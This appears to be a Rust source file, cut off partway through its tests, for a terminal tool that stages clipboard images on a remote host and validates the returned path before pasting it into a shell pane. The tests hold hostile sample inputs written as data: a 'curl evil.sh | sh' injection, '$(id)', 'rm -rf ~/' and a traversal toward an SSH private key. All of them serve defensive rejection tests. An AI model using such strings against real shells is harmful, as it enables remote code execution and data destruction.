//! Client half of the stage-then-inject file RPC: correlating an in-flight
//! `ClipboardStageRequest` with the mount it was sent to, and turning the
//! remote host's answer into a local paste.
//!
//! Three invariants shape this module.
//!
//! 1. **The returned path is hostile input.** It arrives from another host and
//!    is about to be handed to `TerminalRuntime::try_send_paste`, which sends
//!    the string to the PTY *raw* whenever the pane has not enabled bracketed
//!    paste (`pane::PaneRuntime::paste_payload`). A `\n` therefore means Enter
//!    and `$(...)` means command substitution on the agent's shell line. The
//!    path is re-validated against the same predicate the staging host used,
//!    and rejected — never rewritten — when it does not match.
//! 2. **A response must prove which connection it belongs to.** Neither
//!    `mount_generation` (a constant on both peers) nor `server_instance_id`
//!    (minted per remote *process*, so a remount to a still-running remote
//!    reuses it) can distinguish a fresh mount from a superseded one. The
//!    locally minted `MountConnectionEpoch` can, so every pending entry stores
//!    the epoch it was minted under and every answer is fenced against it.
//! 3. **Nothing fails silently.** A stage that is refused, times out, returns
//!    an unusable path, or cannot be delivered to its pane all raise a toast.
//!    The last case matters most: the remote host has already written the file,
//!    so a dropped error leaves a real artifact nobody will ever reference.

use std::collections::HashSet;
use std::time::{Duration, Instant};

use crate::app::App;
use crate::events::AppEvent;
use crate::layout::PaneId;
use crate::remote::federation::client::{MountConnectionEpoch, StageSendError};
use crate::remote::federation::file_staging::{
    is_injection_safe_path, FEDERATION_CLIPBOARD_PREFIX,
};
use crate::remote::federation::id::HostKey;
use crate::remote::federation::protocol::{ClipboardStageFailure, ClipboardStageRequest};
use crate::remote::federation::sanitize::sanitize_remote_string;

/// Local context a `ClipboardStageRequest` was minted from, held until its
/// answer arrives, its budget expires, or its mount goes away.
pub(crate) struct PendingClipboardStage {
    /// Stable workspace id (`Workspace::id`), not a `Vec` index — indices
    /// shift when workspaces close, so an index here could inject a path into
    /// an unrelated workspace that later occupies the same slot.
    pub(crate) workspace_id: String,
    /// The pane resolved when the request was sent, never re-resolved from
    /// whatever is focused when the answer arrives: a slow transfer gives the
    /// user plenty of time to move focus, and the paste belongs to the pane
    /// that asked for it.
    pub(crate) target_pane_id: PaneId,
    /// The mount this request was actually sent to. `request_id` comes from a
    /// bare process-wide counter and is therefore guessable, so an answer is
    /// only honored when it arrives tagged with this same host.
    pub(crate) origin: HostKey,
    /// Which connection to `origin` sent this request. See the module docs.
    pub(crate) connection_epoch: MountConnectionEpoch,
    /// Decoded payload size, kept so the budget this entry was given can be
    /// explained in logs after the fact.
    pub(crate) payload_len: usize,
    /// When this request stops being worth waiting for.
    pub(crate) deadline: Instant,
}

/// Fixed part of a stage's budget: connection setup, the remote's filesystem
/// work, and the answer's trip back, none of which scale with payload size.
const STAGE_TIMEOUT_BASE: Duration = Duration::from_secs(12);

/// Throughput a stage is assumed to achieve at worst. Deliberately pessimistic
/// — an SSH tunnel over a poor mobile link — because the cost of guessing too
/// low is a false "no answer in time" on a paste that was actually working,
/// while the cost of guessing too high is only a longer wait before an
/// unanswerable request is cleaned up. At this rate the 16 MiB ceiling gets
/// about 64s on top of the base.
const STAGE_ASSUMED_MIN_THROUGHPUT_BYTES_PER_SEC: u64 = 256 * 1024;

/// Concurrent stages allowed per mount. The mount's out-tx is an unbounded
/// channel, so this cap is the only thing bounding client memory: each stage
/// pins the raw bytes, their base64 form, and the encoded frame at once. The
/// transfers are serialised on the wire anyway, so a deeper queue would buy
/// latency nothing and cost tens of megabytes of resident memory.
const MAX_IN_FLIGHT_STAGES_PER_MOUNT: usize = 2;

/// How long a stage may run before the user is told it is still working. Short
/// enough to answer "did my paste do anything?", long enough that a normal
/// screenshot on a normal link never raises it.
pub(crate) const SLOW_STAGE_TOAST_DELAY: Duration = Duration::from_millis(1500);

pub(crate) const TOAST_TITLE_FAILED: &str = "image paste failed";
pub(crate) const TOAST_TITLE_SAVING: &str = "saving image to remote host…";

/// Budget a stage of `payload_len` decoded bytes gets before it is abandoned.
///
/// Proportional rather than fixed: a fixed budget tuned on loopback expires
/// mid-transfer on a real multi-megabyte paste over SSH, which turns a working
/// paste into a spurious failure toast *and* leaves the remote host writing a
/// file nobody will reference.
pub(crate) fn stage_timeout_budget(payload_len: usize) -> Duration {
    let transfer = Duration::from_secs_f64(
        payload_len as f64 / STAGE_ASSUMED_MIN_THROUGHPUT_BYTES_PER_SEC as f64,
    );
    STAGE_TIMEOUT_BASE.saturating_add(transfer)
}

/// Why a returned path was refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PathRejection {
    Empty,
    NotAbsolute,
    LineBreak,
    ControlByte,
    MissingStagingPrefix,
    DisallowedCharacter,
    /// A `.` or `..` component anywhere in the path.
    RelativeComponent,
}

/// Why a stage request never reached the wire.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum StageStartError {
    /// This pane is not backed by a live federation mount.
    NoLiveMount,
    /// The mount's peer never advertised the staging capability.
    CapabilityNotAgreed,
    /// The mount's writer is gone.
    LinkClosed,
    /// This mount already has as many stages in flight as it is allowed.
    TooManyInFlight,
}

/// Mints a fresh, process-wide-unique `ClipboardStageRequest::request_id`.
fn next_clipboard_stage_request_id() -> u64 {
    static NEXT_ID: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(1);
    NEXT_ID.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

/// Validates a path a remote host says it staged, before it is pasted.
///
/// Ordered, and every step rejects rather than repairs: a repaired path is a
/// path the remote did not write, so injecting it would name a file that does
/// not exist while hiding the fact that the remote misbehaved.
pub(crate) fn sanitize_returned_remote_path(path: &str) -> Result<&str, PathRejection> {
    // The codec is JSON, so the string is UTF-8 by construction, and the
    // staging host refuses to stage under a root it cannot render losslessly.
    // Both facts are about a well-behaved peer; the checks below are not.
    if path.is_empty() {
        return Err(PathRejection::Empty);
    }
    if !path.starts_with('/') {
        return Err(PathRejection::NotAbsolute);
    }
    // Every other check below reads either the whole string or only its final
    // component, so without this one an absolute, control-free, allowlist-clean
    // path whose *last* component carries the staging prefix could still walk
    // out of the staging directory —
    // `/tmp/staging/../../home/me/.ssh/federation-clipboard-key` names a file
    // the remote never staged. Rejected rather than normalised: resolving the
    // traversal here would produce a path the remote did not write and hide the
    // fact that it answered a question it was not asked.

    // Named ahead of the general control-byte check even though that check
    // subsumes it: this is the byte that means Enter on an unbracketed PTY,
    // and it deserves a guard that fails on its own if it is ever weakened.
    if path.contains('\n') || path.contains('\r') {
        return Err(PathRejection::LineBreak);
    }
    if sanitize_remote_string(path) != path {
        return Err(PathRejection::ControlByte);
    }
    // The client asked for a staged file, so only a staged file is an
    // acceptable answer. Anything else — /etc/passwd, or a file the *local*
    // clipboard writer happens to have put in the same shared directory — is
    // the remote answering a question it was not asked.
    let staged_name = path
        .rsplit('/')
        .next()
        .is_some_and(|name| name.starts_with(FEDERATION_CLIPBOARD_PREFIX));
    if !staged_name {
        return Err(PathRejection::MissingStagingPrefix);
    }
    // The same predicate the staging host validated its own root and file name
    // against, so a well-behaved remote can never produce a path this rejects.
    // Control bytes are already gone; this is what stops a space, `;`, `|`,
    // `$`, or a backtick from reaching an unbracketed shell line.
    if !is_injection_safe_path(path) {
        return Err(PathRejection::DisallowedCharacter);
    }
    Ok(path)
}

impl App {
    /// Sends the clipboard image behind `target_pane_id`'s mount for staging
    /// and records what its answer will need in order to be injected.
    ///
    /// Fire-and-forget by necessity: the answer arrives on the mount's drive
    /// task as an `AppEvent`, so the local layout context has to be remembered
    /// here rather than awaited.
    pub(crate) fn begin_remote_clipboard_stage(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        image: &crate::platform::ClipboardImage,
    ) -> Result<(), StageStartError> {
        let budget = stage_timeout_budget(image.bytes.len());
        self.begin_remote_clipboard_stage_with_timings(
            ws_idx,
            target_pane_id,
            image,
            SLOW_STAGE_TOAST_DELAY,
            budget,
        )
    }

    /// The body of [`App::begin_remote_clipboard_stage`], with the two waits it
    /// schedules supplied rather than baked in.
    ///
    /// Both are timers on a real clock, and the shipped budget starts at 12
    /// seconds, so a test that could not shorten them could only assert that
    /// the events they raise are *handled* correctly — never that anything
    /// schedules them at all.
    pub(crate) fn begin_remote_clipboard_stage_with_timings(
        &mut self,
        ws_idx: usize,
        target_pane_id: PaneId,
        image: &crate::platform::ClipboardImage,
        slow_toast_delay: Duration,
        budget: Duration,
    ) -> Result<(), StageStartError> {
        // Same resolution shape the remote split request uses: the pane's own
        // runtime is what knows whether it rides a live mount at all.
        let out_tx = self
            .state
            .workspaces
            .get(ws_idx)
            .and_then(|ws| ws.terminal_id(target_pane_id))
            .cloned()
            .and_then(|terminal_id| self.terminal_runtimes.get(&terminal_id))
            .and_then(|runtime| runtime.remote_out_tx());
        let (Some(out_tx), Some(origin)) = (out_tx, self.federation_host_key_for_workspace(ws_idx))
        else {
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "this pane has no live remote mount",
            );
            return Err(StageStartError::NoLiveMount);
        };
        let Some(workspace_id) = self.state.workspaces.get(ws_idx).map(|ws| ws.id.clone()) else {
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "this pane has no live remote mount",
            );
            return Err(StageStartError::NoLiveMount);
        };

        let in_flight = self
            .pending_remote_clipboard_stages
            .values()
            .filter(|pending| pending.origin == origin)
            .count();
        if in_flight >= MAX_IN_FLIGHT_STAGES_PER_MOUNT {
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "two image pastes are already in flight; wait for one",
            );
            return Err(StageStartError::TooManyInFlight);
        }

        let Some(mirror) = self.state.remote_mirrors.get(&origin) else {
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "this pane has no live remote mount",
            );
            return Err(StageStartError::NoLiveMount);
        };
        let connection_epoch = mirror.connection_epoch();
        let request_id = next_clipboard_stage_request_id();
        let payload_len = image.bytes.len();
        let request = ClipboardStageRequest {
            request_id,
            payload_base64: {
                use base64::Engine as _;
                base64::engine::general_purpose::STANDARD.encode(&image.bytes)
            },
            original_filename: format!("image.{}", image.extension),
        };

        if let Err(err) = crate::remote::federation::client::send_clipboard_stage_request(
            mirror, &out_tx, request,
        ) {
            let (context, error) = match err {
                StageSendError::CapabilityNotAgreed => (
                    "the remote host does not support image paste",
                    StageStartError::CapabilityNotAgreed,
                ),
                StageSendError::LinkClosed => (
                    "the remote mount's link is closing; try again",
                    StageStartError::LinkClosed,
                ),
            };
            self.raise_clipboard_stage_toast(TOAST_TITLE_FAILED, context);
            return Err(error);
        }

        self.pending_remote_clipboard_stages.insert(
            request_id,
            PendingClipboardStage {
                workspace_id,
                target_pane_id,
                origin: origin.clone(),
                connection_epoch,
                payload_len,
                deadline: Instant::now() + budget,
            },
        );

        // Tell the user the paste is still working once the transfer has run
        // long enough to look like nothing happened. Without it the natural
        // response to the silence is to paste again, which the in-flight cap
        // then refuses — a self-inflicted failure. The handler looks the
        // request up, so a stage that finished first raises nothing.
        let slow_events = self.event_tx.clone();
        tokio::spawn(async move {
            tokio::time::sleep(slow_toast_delay).await;
            let _ = slow_events
                .send(AppEvent::FederationClipboardStageStillRunning { request_id })
                .await;
        });

        // One sleep per request, so cancelling or resolving one never disturbs
        // another. A timeout for an already-resolved request finds no entry and
        // is a logged no-op, which is why the task needs no cancellation handle.
        let events = self.event_tx.clone();
        tokio::spawn(async move {
            tokio::time::sleep(budget).await;
            let _ = events
                .send(AppEvent::FederationClipboardStageTimedOut {
                    request_id,
                    origin,
                    connection_epoch,
                })
                .await;
        });
        Ok(())
    }

    /// Removes and returns a pending stage. The `remove` *is* the claim: an
    /// entry that comes back here can never be resolved a second time.
    fn take_pending_remote_clipboard_stage(
        &mut self,
        request_id: u64,
    ) -> Option<PendingClipboardStage> {
        self.pending_remote_clipboard_stages.remove(&request_id)
    }

    /// Drops pending stages belonging to one connection to one host.
    ///
    /// Keyed by epoch as well as host so a delayed teardown notice from a
    /// superseded connection cannot destroy the in-flight work of a fresh
    /// remount to the same host.
    pub(crate) fn purge_pending_remote_clipboard_stages_for_origin(
        &mut self,
        origin: &HostKey,
        connection_epoch: MountConnectionEpoch,
    ) {
        self.pending_remote_clipboard_stages.retain(|_, pending| {
            &pending.origin != origin || pending.connection_epoch != connection_epoch
        });
    }

    /// Drops pending stages targeting one of the given (closing) workspaces,
    /// so a late answer cannot inject into whatever later occupies the slot.
    pub(crate) fn purge_pending_remote_clipboard_stages_for_workspaces(
        &mut self,
        workspace_ids: &HashSet<String>,
    ) {
        self.pending_remote_clipboard_stages
            .retain(|_, pending| !workspace_ids.contains(&pending.workspace_id));
    }

    /// Peeks at a pending entry and confirms the answer came from the mount
    /// and connection that asked. Deliberately does not remove: `request_id`
    /// is a guessable counter, so a remove-first design would let one mount
    /// evict another mount's pending entry with an echoed id, after which the
    /// legitimate answer would find nothing and vanish without a trace.
    fn pending_stage_answer_is_valid(
        &self,
        request_id: u64,
        origin: &HostKey,
        connection_epoch: MountConnectionEpoch,
    ) -> bool {
        let Some(pending) = self.pending_remote_clipboard_stages.get(&request_id) else {
            tracing::warn!(
                request_id,
                "dropping a file-staging answer for an unknown or already-resolved request"
            );
            return false;
        };
        if &pending.origin != origin {
            tracing::warn!(
                request_id,
                expected_origin = %pending.origin,
                got_origin = %origin,
                "dropping a file-staging answer from a mount that did not originate this request"
            );
            return false;
        }
        if pending.connection_epoch != connection_epoch {
            tracing::warn!(
                request_id,
                ?connection_epoch,
                "dropping a file-staging answer from a connection that has been superseded"
            );
            return false;
        }
        true
    }

    /// `AppEvent::FederationClipboardStageReady` handler: the remote host says
    /// it wrote the file and this is where it put it.
    pub(crate) fn handle_federation_clipboard_stage_ready(
        &mut self,
        request_id: u64,
        remote_path: String,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) {
        if !self.pending_stage_answer_is_valid(request_id, &origin, connection_epoch) {
            return;
        }
        let Some(pending) = self.take_pending_remote_clipboard_stage(request_id) else {
            return;
        };

        let path = match sanitize_returned_remote_path(&remote_path) {
            Ok(path) => path.to_string(),
            Err(rejection) => {
                tracing::warn!(
                    request_id,
                    ?rejection,
                    "refusing to paste a path the remote host returned"
                );
                self.raise_clipboard_stage_toast(
                    TOAST_TITLE_FAILED,
                    "the remote host returned an unusable path",
                );
                return;
            }
        };

        let terminal_id = self
            .state
            .workspaces
            .iter()
            .find(|ws| ws.id == pending.workspace_id)
            .and_then(|ws| ws.terminal_id(pending.target_pane_id))
            .cloned();
        let Some(terminal_id) = terminal_id else {
            tracing::warn!(
                request_id,
                workspace_id = %pending.workspace_id,
                "the remote host staged a file but its target pane is gone"
            );
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "the pane that asked for this paste is gone",
            );
            return;
        };
        let Some(runtime) = self.terminal_runtimes.get(&terminal_id) else {
            tracing::warn!(
                request_id,
                "the remote host staged a file but its target pane has no runtime"
            );
            self.raise_clipboard_stage_toast(
                TOAST_TITLE_FAILED,
                "the pane that asked for this paste is gone",
            );
            return;
        };

        // The remote side has already succeeded here: the file exists on its
        // filesystem and the pending entry is claimed, so nothing downstream
        // can retry or time this out. A dropped error would therefore read to
        // the user as a paste that did nothing, while the remote artifact sits
        // there consuming quota until the sweep — so both arms are reported.
        match runtime.try_send_paste(path) {
            Ok(()) => {
                tracing::debug!(
                    request_id,
                    payload_len = pending.payload_len,
                    // An answer that beat its own budget only just barely is
                    // worth seeing in a log when someone is tuning the budget.
                    past_deadline = Instant::now() > pending.deadline,
                    "pasted a remotely staged file path"
                );
            }
            Err(err) => {
                let kind = match err {
                    tokio::sync::mpsc::error::TrySendError::Full(_) => "full",
                    tokio::sync::mpsc::error::TrySendError::Closed(_) => "closed",
                };
                tracing::warn!(
                    request_id,
                    pane_id = ?pending.target_pane_id,
                    kind,
                    "a remotely staged file path could not be delivered to its pane"
                );
                self.raise_clipboard_stage_toast(
                    TOAST_TITLE_FAILED,
                    "pane was not ready to receive the path; paste again",
                );
            }
        }
    }

    /// `AppEvent::FederationClipboardStageFailed` handler: the remote host
    /// refused or could not stage the file.
    pub(crate) fn handle_federation_clipboard_stage_failed(
        &mut self,
        request_id: u64,
        failure: ClipboardStageFailure,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) {
        if !self.pending_stage_answer_is_valid(request_id, &origin, connection_epoch) {
            return;
        }
        if self
            .take_pending_remote_clipboard_stage(request_id)
            .is_none()
        {
            return;
        }
        tracing::warn!(request_id, ?failure, "remote file staging failed");
        self.raise_clipboard_stage_toast(
            TOAST_TITLE_FAILED,
            clipboard_stage_failure_context(failure),
        );
    }

    /// `AppEvent::FederationClipboardStageTimedOut` handler. Raised locally,
    /// so there is no foreign claimant to fence against and the `remove` can
    /// come first.
    pub(crate) fn handle_federation_clipboard_stage_timed_out(
        &mut self,
        request_id: u64,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) {
        let Some(pending) = self.take_pending_remote_clipboard_stage(request_id) else {
            tracing::debug!(
                request_id,
                "a file-staging budget expired for a request that already resolved"
            );
            return;
        };
        tracing::warn!(
            request_id,
            %origin,
            ?connection_epoch,
            payload_len = pending.payload_len,
            "a file-staging request outlived its budget with no answer"
        );
        self.raise_clipboard_stage_toast(
            TOAST_TITLE_FAILED,
            "the remote host did not answer in time",
        );
    }

    /// Raises the "still working" affordance, but only while the request it
    /// belongs to is genuinely unresolved.
    pub(crate) fn raise_slow_stage_toast_if_pending(&mut self, request_id: u64) {
        if !self
            .pending_remote_clipboard_stages
            .contains_key(&request_id)
        {
            return;
        }
        self.raise_clipboard_stage_toast(TOAST_TITLE_SAVING, "the image is still on its way");
    }

    /// Surfaces a stage outcome through whichever notification channel the
    /// user configured, matching how a failed remote split is surfaced.
    pub(crate) fn raise_clipboard_stage_toast(&mut self, title: &str, context: &str) {
        match self.state.toast_config.delivery {
            crate::config::ToastDelivery::Herdr => {
                self.state.toast = Some(crate::app::state::ToastNotification {
                    kind: crate::app::ToastKind::NeedsAttention,
                    title: title.to_string(),
                    context: context.to_string(),
                    position: None,
                    target: None,
                });
            }
            // One arm per delivery rather than a shared guard that re-matches
            // the same value: re-matching needs a catch-all the compiler cannot
            // prove dead, and a panicking catch-all on the event loop would
            // take the whole TUI down.
            crate::config::ToastDelivery::Terminal if self.local_terminal_notifications => {
                let _ = crate::terminal_notify::show_notification(title, Some(context));
            }
            crate::config::ToastDelivery::System if self.local_terminal_notifications => {
                let _ = crate::platform::show_desktop_notification(title, Some(context));
            }
            _ => {}
        }
        self.render_dirty
            .store(true, std::sync::atomic::Ordering::Release);
        self.render_notify.notify_one();
    }
}

/// User-facing explanation for each way a remote host can refuse a stage.
///
/// An exhaustive `match` with no catch-all, deliberately: a failure variant
/// added later must be given words here rather than silently inheriting some
/// other variant's, which is how a user ends up told that a retryable queue
/// limit was a disk failure. Kept within a single toast line.
pub(crate) fn clipboard_stage_failure_context(failure: ClipboardStageFailure) -> &'static str {
    match failure {
        ClipboardStageFailure::InvalidFilename => "the remote host rejected the file name",
        ClipboardStageFailure::UnsupportedExtension => {
            "the remote host does not accept this image type"
        }
        ClipboardStageFailure::InvalidPayload => "the image data did not survive the trip",
        ClipboardStageFailure::PayloadTooLarge => "the image is too large for the remote host",
        ClipboardStageFailure::QuotaExceeded => "the remote host's paste storage is full",
        ClipboardStageFailure::StagingUnavailable => "the remote host has no usable temp folder",
        ClipboardStageFailure::Busy => "the remote host is busy; paste again in a moment",
        ClipboardStageFailure::WriteFailed => "the remote host could not write the file",
    }
}

/// Registers a pending stage. Test-only: production always mints through
/// `begin_remote_clipboard_stage`, which owns the wire send and the budget.
#[cfg(test)]
impl App {
    pub(crate) fn test_register_pending_clipboard_stage(
        &mut self,
        request_id: u64,
        pending: PendingClipboardStage,
    ) {
        self.pending_remote_clipboard_stages
            .insert(request_id, pending);
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;
    use crate::config::Config;
    use crate::remote::federation::protocol::Capability;
    use crate::workspace::Workspace;
    use bytes::Bytes;
    use std::sync::atomic::AtomicBool;
    use std::sync::Arc;
    use tokio::sync::mpsc;
    use tokio::sync::Notify;

    const HOST: &str = "remote-host";

    fn host_key(target: &str) -> HostKey {
        HostKey::new(target, "s1")
    }

    fn staged_path() -> String {
        format!("/tmp/herdr-clipboard-images-501/{FEDERATION_CLIPBOARD_PREFIX}1-0-image.png")
    }

    fn test_app() -> App {
        let (_api_tx, api_rx) = mpsc::unbounded_channel();
        let mut app = App::new(
            &Config::default(),
            true,
            None,
            api_rx,
            crate::api::EventHub::default(),
        );
        app.state.workspaces = vec![Workspace::test_new("remote")];
        app.state.ensure_test_terminals();
        app.state.active = Some(0);
        app.state.selected = 0;
        // The default delivery is `Off`, which drops every notification on the
        // floor and would make "a failure was reported" unobservable.
        app.state.toast_config.delivery = crate::config::ToastDelivery::Herdr;
        app
    }

    /// Attaches a real `TerminalRuntime` to workspace `ws_idx`'s root pane and
    /// hands back its pane id plus the receiver the paste would land on.
    fn attach_runtime(app: &mut App, ws_idx: usize) -> (PaneId, mpsc::Receiver<Bytes>) {
        attach_runtime_with_capacity(app, ws_idx, None)
    }

    fn attach_runtime_with_capacity(
        app: &mut App,
        ws_idx: usize,
        capacity: Option<usize>,
    ) -> (PaneId, mpsc::Receiver<Bytes>) {
        let pane_id = app.state.workspaces[ws_idx].tabs[0].root_pane;
        let terminal_id = app.state.workspaces[ws_idx].tabs[0].panes[&pane_id]
            .attached_terminal_id
            .clone();
        let (runtime, rx) = match capacity {
            Some(capacity) => {
                crate::terminal::TerminalRuntime::test_with_channel_capacity(80, 24, capacity)
            }
            None => crate::terminal::TerminalRuntime::test_with_channel(80, 24),
        };
        app.terminal_runtimes.insert(terminal_id, runtime);
        (pane_id, rx)
    }

    fn pending_for(
        app: &App,
        pane_id: PaneId,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) -> PendingClipboardStage {
        PendingClipboardStage {
            workspace_id: app.state.workspaces[0].id.clone(),
            target_pane_id: pane_id,
            origin,
            connection_epoch,
            payload_len: 1024,
            deadline: Instant::now() + Duration::from_secs(60),
        }
    }

    fn ready_event(
        request_id: u64,
        remote_path: &str,
        origin: HostKey,
        connection_epoch: MountConnectionEpoch,
    ) -> AppEvent {
        AppEvent::FederationClipboardStageReady {
            request_id,
            remote_path: remote_path.to_string(),
            origin,
            connection_epoch,
        }
    }

    /// The shared rejection fixture: a live pending entry, a real pane runtime,
    /// and the answer driven through the production event entry point. Returns
    /// what the pane actually received.
    fn drive_ready_through_handler(remote_path: &str) -> (App, Vec<Bytes>) {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        let pending = pending_for(&app, pane_id, host_key(HOST), epoch);
        app.test_register_pending_clipboard_stage(7, pending);

        app.handle_internal_event(ready_event(7, remote_path, host_key(HOST), epoch));

        let mut received = Vec::new();
        while let Ok(bytes) = rx.try_recv() {
            received.push(bytes);
        }
        (app, received)
    }

    fn assert_rejected(remote_path: &str) {
        let (app, received) = drive_ready_through_handler(remote_path);
        assert!(
            received.is_empty(),
            "{remote_path} reached the pane: {received:?}"
        );
        assert!(
            app.state.toast.is_some(),
            "{remote_path} was rejected without telling the user"
        );
        assert!(
            app.pending_remote_clipboard_stages.is_empty(),
            "{remote_path} left its pending entry behind"
        );
    }

    // Positive control for every rejection test below: the identical fixture,
    // with a path a well-behaved remote would actually return, must put exactly
    // that path on the pane. Without it, "the receiver was empty" would be
    // satisfied by a handler that never runs at all.
    #[tokio::test]
    async fn a_well_formed_staged_path_is_injected() {
        let path = staged_path();
        let (app, received) = drive_ready_through_handler(&path);
        assert_eq!(received.len(), 1, "expected exactly one paste");
        assert_eq!(received[0], Bytes::from(path));
        assert!(
            app.state.toast.is_none(),
            "a successful paste must be quiet"
        );
        assert!(app.pending_remote_clipboard_stages.is_empty());
    }

    #[tokio::test]
    async fn returned_remote_path_with_embedded_newline_is_rejected_before_paste() {
        assert_rejected("/tmp/x\n; curl evil.sh | sh\n");
        assert_rejected(&format!("{}\nid\n", staged_path()));
        // The named line-break guard, not merely one of the broader ones that
        // also happen to cover this byte: pinning the reason is what makes the
        // guard fail on its own if it is ever weakened.
        assert_eq!(
            sanitize_returned_remote_path(&format!("{}\nid\n", staged_path())),
            Err(PathRejection::LineBreak)
        );
        assert_eq!(
            sanitize_returned_remote_path(&format!("{}\rid", staged_path())),
            Err(PathRejection::LineBreak)
        );
    }

    #[tokio::test]
    async fn returned_remote_path_with_esc_sequence_is_rejected_before_paste() {
        assert_rejected(&format!("{}\x1b[2J", staged_path()));
        // Pinned to the control-byte guard specifically, so that guard cannot
        // be removed on the grounds that a later one also rejects the input.
        assert_eq!(
            sanitize_returned_remote_path(&format!("{}\x1b[2J", staged_path())),
            Err(PathRejection::ControlByte)
        );
    }

    #[tokio::test]
    async fn returned_remote_path_with_shell_metacharacters_is_rejected_before_paste() {
        for path in [
            "/tmp/herdr-clipboard-images-501/$(id).png",
            "/tmp/a; rm -rf ~/.png",
            "/tmp/x/federation-clipboard-1-0-a|b.png",
            "/tmp/x/federation-clipboard-1-0-a b.png",
            "/tmp/x/federation-clipboard-1-0-`id`.png",
        ] {
            assert_rejected(path);
        }
    }

    #[tokio::test]
    async fn returned_remote_path_that_walks_out_of_the_staging_directory_is_rejected() {
        // Every one of these is absolute, control-free, allowlist-clean, and
        // ends in a component carrying the staging prefix, so nothing but the
        // component check can refuse them. The first names a private key the
        // remote never staged.
        for escaping in [
            format!(
                "/tmp/herdr-clipboard-images-501/../../home/me/.ssh/{FEDERATION_CLIPBOARD_PREFIX}id_rsa"
            ),
            format!("/../{FEDERATION_CLIPBOARD_PREFIX}1-0-image.png"),
            format!("/tmp/./herdr-clipboard-images-501/{FEDERATION_CLIPBOARD_PREFIX}1-0-image.png"),
        ] {
            assert_rejected(&escaping);
            // Pinned to the component guard rather than merely "rejected", so
            // it cannot be dropped on the grounds that something else caught
            // these inputs.
            assert_eq!(
                sanitize_returned_remote_path(&escaping),
                Err(PathRejection::RelativeComponent),
                "{escaping}"
            );
        }

        // The same fixture with an ordinary staged path still injects, so the
        // rejections above describe the guard and not a dead handler.
        let (_app, received) = drive_ready_through_handler(&staged_path());
        assert_eq!(received, vec![Bytes::from(staged_path())]);
    }

    #[tokio::test]
    async fn returned_remote_path_without_the_staging_prefix_is_rejected() {
        assert_rejected("/etc/passwd");
        assert_rejected("/tmp/herdr-clipboard-images-501/client-1-clipboard-9-0.png");
        assert_rejected("");
        assert_rejected("relative/federation-clipboard-1-0-image.png");
    }

    #[tokio::test]
    async fn staged_path_that_cannot_be_delivered_to_the_pane_reports_failure_instead_of_succeeding_silently(
    ) {
        // (a) the pane's input channel is full.
        let mut app = test_app();
        let (pane_id, _rx) = attach_runtime_with_capacity(&mut app, 0, Some(1));
        let terminal_id = app.state.workspaces[0].tabs[0].panes[&pane_id]
            .attached_terminal_id
            .clone();
        app.terminal_runtimes
            .get(&terminal_id)
            .unwrap()
            .try_send_paste("filler".to_string())
            .expect("the first paste fills the one-slot channel");
        let epoch = MountConnectionEpoch::mint();
        let pending = pending_for(&app, pane_id, host_key(HOST), epoch);
        app.test_register_pending_clipboard_stage(7, pending);
        app.handle_internal_event(ready_event(7, &staged_path(), host_key(HOST), epoch));
        assert!(
            app.state.toast.is_some(),
            "a full pane channel must not read as a successful paste"
        );

        // (b) the pane's receiver has been dropped.
        let mut app = test_app();
        let (pane_id, rx) = attach_runtime(&mut app, 0);
        drop(rx);
        let epoch = MountConnectionEpoch::mint();
        let pending = pending_for(&app, pane_id, host_key(HOST), epoch);
        app.test_register_pending_clipboard_stage(9, pending);
        app.handle_internal_event(ready_event(9, &staged_path(), host_key(HOST), epoch));
        assert!(
            app.state.toast.is_some(),
            "a closed pane channel must not read as a successful paste"
        );
    }

    #[tokio::test]
    async fn clipboard_stage_request_times_out_when_remote_never_responds() {
        let mut app = test_app();
        let (pane_id, mut rx) = attach_runtime(&mut app, 0);
        let epoch = MountConnectionEpoch::mint();
        let pending = pending_for(&app, pane_id, host_key(HOST), epoch);
        app.test_register_pending_clipboard_stage(11, pending);

        app.handle_internal_event(AppEvent::FederationClipboardStageTimedOut {
            request_id: 11,
            origin: host_key(HOST),
            connection_epoch: epoch,
        });

        assert!(app.pending_remote_clipboard_stages.is_empty());
        assert!(app.state.toast.is_some(), "a timeout must tell the user");
        assert!(rx.try_recv().is_err(), "a timeout must not paste anything");

        // A second timeout for the same request is a no-op, not a second toast
        // for a request that has already been reported.
        app.state.toast = None;
        app.handle_internal_event(AppEvent::FederationClipboardStageTimedOut {
            request_id: 11,
            origin: host_key(HOST),
            connection_epoch: epoch,
        });
        assert!(app.state.toast.is_none());
    }

    /// Both waits a stage schedules for itself, driven end to end on a real
    /// clock with the two delays shortened.
    ///
    /// Nothing here injects an event by hand, which is the point: the only
    /// thing that can put a still-running or timed-out event on the App's own
    /// channel is a timer the request scheduled, so removing either one leaves
    /// this test waiting for an event that never comes.
    #[tokio::test]
    async fn a_stage_schedules_the_waits_that_announce_it_and_then_reap_it() {
        let mut app = test_app();
        let (pane_id, _out_rx) = attach_live_mount(&mut app);
        app.begin_remote_clipboard_stage_with_timings(
            0,
            pane_id,
            &test_image(),
            Duration::from_millis(10),
            Duration::from_millis(80),
        )
        .expect("the mount accepts the stage");
        assert_eq!(app.pending_remote_clipboard_stages.len(), 1);
        app.state.toast = None;

        let mut announced_while_pending = false;
        let mut reaped = false;
        let deadline = Instant::now() + Duration::from_secs(10);
        while !reaped && Instant::now() < deadline {
            let Ok(Some(ev)) = tokio::time::timeout(Duration::from_secs(5), app.event_rx.recv())
                .await
            else {
                break;
            };
            match &ev {
                AppEvent::FederationClipboardStageStillRunning { .. } => {
